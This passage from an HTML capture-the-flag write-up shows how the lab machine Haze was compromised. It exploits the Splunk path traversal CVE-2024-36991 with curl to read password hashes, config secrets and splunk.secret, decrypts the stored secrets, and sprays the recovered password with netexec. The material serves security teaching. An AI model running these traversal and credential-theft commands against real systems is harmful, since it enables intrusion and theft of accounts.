class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\oxdf: STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>I’ll have to check back once I acquire some creds.</p> <h3 id="splunk">Splunk</h3> <h4 id="background">Background</h4> <p><a href="https://www.splunk.com/en_us/blog/learn/what-splunk-does.html">Splunk</a> Enterprise is a security information and event management (SIEM) platform. It takes in all kinds of log and other data, processes and indexes it so that it can be easily searched against, and allows for creating of rules that will generate actions and dashboards to show trends and outliers. It is very common in security operation centers (SOCs).</p> <p><a href="https://help.splunk.com/en/splunk-enterprise/administer/inherit-a-splunk-deployment/9.0/inherited-deployment-tasks/components-and-their-relationship-with-the-network">This page</a> from the Splunk docs shows the different ports involved in a Splunk deployment. Three of the ports / services in that list are present on Haze. 8000 is part of the “search head / indexer” and is used for web access. 8089 is the REST API. And 8088 is the HTTP event collector (HEC).</p> <h4 id="splunk-web---tcp-8000">Splunk Web - TCP 8000</h4> <p>Visiting port 8000 in a web browser returns a redirect to <code class="language-plaintext highlighter-rouge">/en-US/account/login?return_to=%2Fen-US%2F</code>, a Splunk login page:</p> <picture> <source type="image/webp" srcset="/img/image-20250623134355318.webp" /> <img loading="lazy" src="/img/image-20250623134355318.png" alt="image-20250623134355318" class="include_image " /> </picture> <p>The <a href="https://docs.splunk.com/Documentation/VMW/4.0.4/User/Loginandgetstarted">Splunk User Guide</a> suggests that the default creds are admin / changeme, but they don’t work here.</p> <p>Not much else I can enumerate here without creds.</p> <h4 id="splunk-hec---tcp-8080">Splunk HEC - TCP 8080</h4> <p>This service offers HTTPS. The TLS certificate doesn’t offer anything interesting, and the page simply returns 404 not found:</p> <picture> <source type="image/webp" srcset="/img/image-20250623181537355.webp" /> <img loading="lazy" src="/img/image-20250623181537355.png" alt="image-20250623181537355" class="include_image " /> </picture> <p>That looks exactly like the <a href="/cheatsheets/404#apache--httpd">default Apache 404 page</a> with <code class="language-plaintext highlighter-rouge">ServerSignature Off</code> configured.</p> <h4 id="splunk-api---tcp-8089">Splunk API - TCP 8089</h4> <p>Visiting port 8089 shows the “Splunk Atom Feed”:</p> <picture> <source type="image/webp" srcset="/img/image-20250623181700881.webp" /> <img loading="lazy" src="/img/image-20250623181700881.png" alt="image-20250623181700881" class="include_image " /> </picture> <p>At the top I’ll note that it’s running version 9.2.1.</p> <p>Not important to the box, but it’s interesting to note that the response from the server is actually an XML file:</p> <div class="language-xml code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="c">&lt;!--This is to override browser formatting; see server.conf[httpServer] to disable. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .--&gt;</span> <span class="cp">&lt;?xml-stylesheet type="text/xml" href="/static/atom.xsl"?&gt;</span> <span class="nt">&lt;feed</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2005/Atom"</span> <span class="na">xmlns:s=</span><span class="s">"http://dev.splunk.com/ns/rest"</span><span class="nt">&gt;</span> <span class="nt">&lt;title&gt;</span>splunkd<span class="nt">&lt;/title&gt;</span> <span class="nt">&lt;id&gt;</span>https://haze.htb:8089/<span class="nt">&lt;/id&gt;</span> <span class="nt">&lt;updated&gt;</span>2025-06-23T23:19:35-07:00<span class="nt">&lt;/updated&gt;</span> <span class="nt">&lt;generator</span> <span class="na">build=</span><span class="s">"78803f08aabb"</span> <span class="na">version=</span><span class="s">"9.2.1"</span><span class="nt">/&gt;</span> <span class="nt">&lt;author&gt;</span> <span class="nt">&lt;name&gt;</span>Splunk<span class="nt">&lt;/name&gt;</span> <span class="nt">&lt;/author&gt;</span> <span class="nt">&lt;entry&gt;</span> <span class="nt">&lt;title&gt;</span>rpc<span class="nt">&lt;/title&gt;</span> <span class="nt">&lt;id&gt;</span>https://haze.htb:8089/rpc<span class="nt">&lt;/id&gt;</span> <span class="nt">&lt;updated&gt;</span>1969-12-31T16:00:00-08:00<span class="nt">&lt;/updated&gt;</span> <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/rpc"</span> <span class="na">rel=</span><span class="s">"alternate"</span><span class="nt">/&gt;</span> <span class="nt">&lt;/entry&gt;</span> <span class="nt">&lt;entry&gt;</span> <span class="nt">&lt;title&gt;</span>services<span class="nt">&lt;/title&gt;</span> <span class="nt">&lt;id&gt;</span>https://haze.htb:8089/services<span class="nt">&lt;/id&gt;</span> <span class="nt">&lt;updated&gt;</span>1969-12-31T16:00:00-08:00<span class="nt">&lt;/updated&gt;</span> <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/services"</span> <span class="na">rel=</span><span class="s">"alternate"</span><span class="nt">/&gt;</span> <span class="nt">&lt;/entry&gt;</span> <span class="nt">&lt;entry&gt;</span> <span class="nt">&lt;title&gt;</span>servicesNS<span class="nt">&lt;/title&gt;</span> <span class="nt">&lt;id&gt;</span>https://haze.htb:8089/servicesNS<span class="nt">&lt;/id&gt;</span> <span class="nt">&lt;updated&gt;</span>1969-12-31T16:00:00-08:00<span class="nt">&lt;/updated&gt;</span> <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/servicesNS"</span> <span class="na">rel=</span><span class="s">"alternate"</span><span class="nt">/&gt;</span> <span class="nt">&lt;/entry&gt;</span> <span class="nt">&lt;entry&gt;</span> <span class="nt">&lt;title&gt;</span>static<span class="nt">&lt;/title&gt;</span> <span class="nt">&lt;id&gt;</span>https://haze.htb:8089/static<span class="nt">&lt;/id&gt;</span> <span class="nt">&lt;updated&gt;</span>1969-12-31T16:00:00-08:00<span class="nt">&lt;/updated&gt;</span> <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/static"</span> <span class="na">rel=</span><span class="s">"alternate"</span><span class="nt">/&gt;</span> <span class="nt">&lt;/entry&gt;</span> <span class="nt">&lt;/feed&gt;</span> </code></pre></div></div> <p>The third line has a reference to an xml-stylesheet at <code class="language-plaintext highlighter-rouge">/static/atom.xsl</code>, which provides the structure and CSS to convert it to a nicely formatted page.</p> <h2 id="auth-as-paultaylor">Auth as paul.taylor</h2> <h3 id="cve-2024-36991">CVE-2024-36991</h3> <h4 id="identify">Identify</h4> <p>Splunk has a <a href="https://advisory.splunk.com/advisories">security advisories page</a>. I’ll look for vulnerabilities before mid-March 2025 (when Haze released) where the severity is critical and there are none that look interesting. I’ll drop severity to high, and remove “Third-Party Package” issues, and there are a few 2024 CVEs that look interesting:</p> <picture> <source type="image/webp" srcset="/img/image-20250623202623231.webp" /> <img loading="lazy" src="/img/image-20250623202623231.png" alt="image-20250623202623231" class="include_image " /> </picture> <p>The <a href="https://help.splunk.com/en/splunk-enterprise/release-notes-and-updates/release-notes/9.2/fixed-issues/fixed-issues/splunk-enterprise-9.2.1-fixed-issues">release notes for version 9.2.1</a> show it fixing a lot of issues from Feb 2024, so that limits it to about what’s shown above. When I ignore the ones that require auth, there’s only one left, CVE-2024-36991.</p> <h4 id="background-1">Background</h4> <p><a href="https://nvd.nist.gov/vuln/detail/cve-2024-36991">CVE-2024-36991</a> is described as:</p> <blockquote> <p>In Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10, an attacker could perform a path traversal on the /modules/messaging/ endpoint in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.</p> </blockquote> <p>It’s a directory traversal vulnerability leading to file read for Splunk Enterprise on Windows for versions below 9.2.2. That seems like a perfect fit. The <a href="https://advisory.splunk.com/advisories/SVD-2024-0711">Splunk advisory</a> adds:</p> <blockquote> <p>The vulnerability exists because the Python <code class="language-plaintext highlighter-rouge">os.path.join</code> function removes the drive letter from path tokens if the drive in the token matches the drive in the built path.</p> </blockquote> <p>There were a fair number of news stories about this vulnerability in July 2024:</p> <picture> <source type="image/webp" srcset="/img/image-20250623211506235.webp" /> <img loading="lazy" src="/img/image-20250623211506235.png" alt="image-20250623211506235" class="include_image " /> </picture> <h4 id="poc">POC</h4> <p><a href="https://www.vicarius.io/vsociety/posts/exploiting-path-traversal-in-splunk-cve-2024-36991">This post</a> from vsociety gives a short breakdown of a POC. The critical point is to use a path such as <code class="language-plaintext highlighter-rouge">/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd</code>. I’ve looked at simple <code class="language-plaintext highlighter-rouge">os.path.join</code> vulnerabilities before, but this is more complex. The server must be breaking apart the URL path and parsing it one section at a time. Regardless, I’ll give it a try:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">--path-as-is</span> <span class="s1">'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'</span> <span class="go">:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152 :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152 :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152 :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152 </span></code></pre></div></div> <p>It works!</p> <p>This path may look a bit confusing for a Windows host. The Splunk configuration files are stored in the <code class="language-plaintext highlighter-rouge">etc</code> directory inside the Splunk installation directory, on Windows typically <code class="language-plaintext highlighter-rouge">C:\Program Files\Splunk\etc</code>. I can test this by adding additional <code class="language-plaintext highlighter-rouge">C:../</code> to get up to the root of <code class="language-plaintext highlighter-rouge">C:</code> and then back into the <code class="language-plaintext highlighter-rouge">Splunk</code> directory:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">--path-as-is</span> <span class="s1">'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/passwd'</span> <span class="go">:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152 :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152 :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152 :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152 </span></code></pre></div></div> <p>It works!</p> <h3 id="filesystem-enumeration">Filesystem Enumeration</h3> <p>The <code class="language-plaintext highlighter-rouge">passwd</code> file has hashes for accounts on the Splunk web login. There are other interesting files I might want to check out with the Splunk configuration. <a href="https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.1-configuration-file-reference">This page</a> in the Splunk docs shows a ton of <code class="language-plaintext highlighter-rouge">conf</code> files with links to a page on each. Many of these files have the default versions in <code class="language-plaintext highlighter-rouge">etc/system/default</code>, and user updates are made in <code class="language-plaintext highlighter-rouge">etc/system/local</code>. Most of these files don’t exist in <code class="language-plaintext highlighter-rouge">etc/system/local</code> on Haze, which makes them less interesting.</p> <p>In poking around for these files, I’ll find a few interesting files. <code class="language-plaintext highlighter-rouge">etc/system/local/authentication.conf</code> has LDAP binding information for a user named Paul Taylor:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="500"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">--path-as-is</span> <span class="s1">'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'</span> <span class="nn">[splunk_auth]</span> <span class="py">minPasswordLength</span> <span class="p">=</span> <span class="s">8</span> <span class="py">minPasswordUppercase</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordLowercase</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordSpecial</span> <span class="p">=</span> <span class="s">0</span> <span class="py">minPasswordDigit</span> <span class="p">=</span> <span class="s">0</span> <span class="nn">[Haze LDAP Auth]</span> <span class="py">SSLEnabled</span> <span class="p">=</span> <span class="s">0</span> <span class="py">anonymous_referrals</span> <span class="p">=</span> <span class="s">1</span> <span class="py">bindDN</span> <span class="p">=</span> <span class="s">CN=Paul Taylor,CN=Users,DC=haze,DC=htb</span> <span class="py">bindDNpassword</span> <span class="p">=</span> <span class="s">$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=</span> <span class="py">charset</span> <span class="p">=</span> <span class="s">utf8</span> <span class="py">emailAttribute</span> <span class="p">=</span> <span class="s">mail</span> <span class="py">enableRangeRetrieval</span> <span class="p">=</span> <span class="s">0</span> <span class="py">groupBaseDN</span> <span class="p">=</span> <span class="s">CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb</span> <span class="py">groupMappingAttribute</span> <span class="p">=</span> <span class="s">dn</span> <span class="py">groupMemberAttribute</span> <span class="p">=</span> <span class="s">member</span> <span class="py">groupNameAttribute</span> <span class="p">=</span> <span class="s">cn</span> <span class="py">host</span> <span class="p">=</span> <span class="s">dc01.haze.htb</span> <span class="py">nestedGroups</span> <span class="p">=</span> <span class="s">0</span> <span class="py">network_timeout</span> <span class="p">=</span> <span class="s">20</span> <span class="py">pagelimit</span> <span class="p">=</span> <span class="s">-1</span> <span class="py">port</span> <span class="p">=</span> <span class="s">389</span> <span class="py">realNameAttribute</span> <span class="p">=</span> <span class="s">cn</span> <span class="py">sizelimit</span> <span class="p">=</span> <span class="s">1000</span> <span class="py">timelimit</span> <span class="p">=</span> <span class="s">15</span> <span class="py">userBaseDN</span> <span class="p">=</span> <span class="s">CN=Users,DC=haze,DC=htb</span> <span class="py">userNameAttribute</span> <span class="p">=</span> <span class="s">samaccountname</span> <span class="nn">[authentication]</span> <span class="py">authSettings</span> <span class="p">=</span> <span class="s">Haze LDAP Auth</span> <span class="py">authType</span> <span class="p">=</span> <span class="s">LDAP</span> </code></pre></div></div> <p>I’ll note that hash.</p> <p><code class="language-plaintext highlighter-rouge">server.conf</code> has a couple hashes as well:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">--path-as-is</span> <span class="s1">'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/server.conf'</span> <span class="nn">[general]</span> <span class="py">serverName</span> <span class="p">=</span> <span class="s">dc01</span> <span class="py">pass4SymmKey</span> <span class="p">=</span> <span class="s">$7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==</span> <span class="nn">[sslConfig]</span> <span class="py">sslPassword</span> <span class="p">=</span> <span class="s">$7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==</span> <span class="nn">[lmpool:auto_generated_pool_download-trial]</span> <span class="py">description</span> <span class="p">=</span> <span class="s">auto_generated_pool_download-trial</span> <span class="py">peers</span> <span class="p">=</span> <span class="s">*</span> <span class="py">quota</span> <span class="p">=</span> <span class="s">MAX</span> <span class="py">stack_id</span> <span class="p">=</span> <span class="s">download-trial</span> <span class="nn">[lmpool:auto_generated_pool_forwarder]</span> <span class="py">description</span> <span class="p">=</span> <span class="s">auto_generated_pool_forwarder</span> <span class="py">peers</span> <span class="p">=</span> <span class="s">*</span> <span class="py">quota</span> <span class="p">=</span> <span class="s">MAX</span> <span class="py">stack_id</span> <span class="p">=</span> <span class="s">forwarder</span> <span class="nn">[lmpool:auto_generated_pool_free]</span> <span class="py">description</span> <span class="p">=</span> <span class="s">auto_generated_pool_free</span> <span class="py">peers</span> <span class="p">=</span> <span class="s">*</span> <span class="py">quota</span> <span class="p">=</span> <span class="s">MAX</span> <span class="py">stack_id</span> <span class="p">=</span> <span class="s">free</span> <span class="nn">[license]</span> <span class="py">active_group</span> <span class="p">=</span> <span class="s">Forwarder</span> </code></pre></div></div> <p>I’ll also want to grab <code class="language-plaintext highlighter-rouge">etc/auth/splunk.secret</code>, which will be necessary to decrypt these hashes later:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> <span class="s1">'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret'</span> <span class="nt">-s</span> | <span class="nb">tee </span>splunk.secret <span class="go">NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD </span></code></pre></div></div> <h3 id="recover-passwords">Recover Passwords</h3> <h4 id="passwd">passwd</h4> <p>There are several hashes in from the <code class="language-plaintext highlighter-rouge">passwd</code> file that are standard sha512crypt hashes like in a Linux <code class="language-plaintext highlighter-rouge">passwd</code> file. I’ll run them against <code class="language-plaintext highlighter-rouge">hashcat</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> in <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">mode 1800</a>, but none of them crack.</p> <h4 id="format">Format</h4> <p><code class="language-plaintext highlighter-rouge">$7$</code> doesn’t show up in the <code class="language-plaintext highlighter-rouge">hashcat</code> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes page</a>. Searching for it, the top result is a Python package named <code class="language-plaintext highlighter-rouge">splunksecrets</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250624103607374.webp" /> <img loading="lazy" src="/img/image-20250624103607374.png" alt="image-20250624103607374" class="include_image " /> </picture> <p>The <a href="https://github.com/HurricaneLabs/splunksecrets">GitHub README</a> says:</p> <blockquote> <p>Starting in Splunk 7.2, AES256-GCM is used for encryption of secrets, indicated in configuration files by <code class="language-plaintext highlighter-rouge">$7$</code> in the encrypted password. The <code class="language-plaintext highlighter-rouge">PBKDF2</code> algorithm is used to derive an encryption key from all 254 bytes of <code class="language-plaintext highlighter-rouge">splunk.secret</code> (the newline character is stripped from the end of the file), using a static salt of <code class="language-plaintext highlighter-rouge">disk-encryption</code> and a single iteration. This 256-bit key is then used as the encryption key for AES256-GCM, with a 16-byte randomly generated initialization vector. The encryption produces both the ciphertext as well as a “tag” that is used as part of integrity verification. The iv, ciphertext, and tag (in that order) are concatenated, base64-encoded, and prepended with <code class="language-plaintext highlighter-rouge">$7$</code> to produce the encrypted password seen in the configuration files. If the key is less than 254-bytes it is padded with null bytes.</p> </blockquote> <p>The hash is not actually a hash, but rather data encrypted with the value in the <code class="language-plaintext highlighter-rouge">splunk.secret</code> file. This is actually a case where encryption is less secure than hashing, as the process can be reversed. Personally, I think it’s a bit confusing of Splunk to invent this format, as most (if not all) other <code class="language-plaintext highlighter-rouge">$digit$</code> formats are hashes.</p> <h4 id="decrypt">Decrypt</h4> <p>I’ll install the tool using <code class="language-plaintext highlighter-rouge">uv</code> as shown in the <code class="language-plaintext highlighter-rouge">README</code> (<a href="/cheatsheets/uv#">uv cheatsheet</a>), and run it, passing the secret file and the encrypted data:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>splunksecrets splunk-decrypt <span class="nt">-S</span> splunk.secret <span class="nt">--ciphertext</span> <span class="s1">'$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='</span> <span class="go">Ld@p_Auth_Sp1unk@2k24 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>splunksecrets splunk-decrypt <span class="nt">-S</span> splunk.secret <span class="nt">--ciphertext</span> <span class="s1">'$7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA=='</span> <span class="go">changeme </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>splunksecrets splunk-decrypt <span class="nt">-S</span> splunk.secret <span class="nt">--ciphertext</span> <span class="s1">'$7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw=='</span> <span class="go">password </span></code></pre></div></div> <p>Because the data is encrypted and not hashes, there’s no guessing or brute force. The second two seem less useful, but the first looks interesting!</p> <h3 id="validate">Validate</h3> <p>The config file shows the user as “CN=Paul Taylor,CN=Users,DC=haze,DC=htb”. I’ll use <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a> to come up with likely usernames:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>./username-anarchy paul taylor | <span class="nb">tee </span>paul_usernames <span class="go">paul paultaylor paul.taylor paultayl pault p.taylor ptaylor tpaul t.paul taylorp taylor taylor.p taylor.paul pt </span></code></pre></div></div> <p>Now I can try that password with each using <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> paul_usernames <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span></code></pre></div></div> <p>It’s paul.taylor. paul.taylor cannot WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.61 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span></code></pre></div></div> <h2 id="shell-as-markadams">Shell as mark.adams</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="smb-shares">SMB Shares</h4> <p>The SMB shares on the box are the default active directory DC shares:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span></code></pre></div></div> <p>There’s nothing interesting on them.</p> <h4 id="smb-user-enum">SMB User Enum</h4> <p>I’ll try to enumerate users, but there’s a very weird result:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 -Username- -Last PW Set- -BadPW- -Description- </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 paul.taylor 2025-06-24 04:42:30 0 </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 1 local users: HAZE </span></code></pre></div></div> <p>There must be more than one user on this box / domain. I’ll try a RID bruteforce:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb haze.htb <span class="nt">-u</span> paul.taylor <span class="nt">-p</span> <span class="s1">'Ld@p_Auth_Sp1unk@2k24'</span> <span class="nt">--rid-brute</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 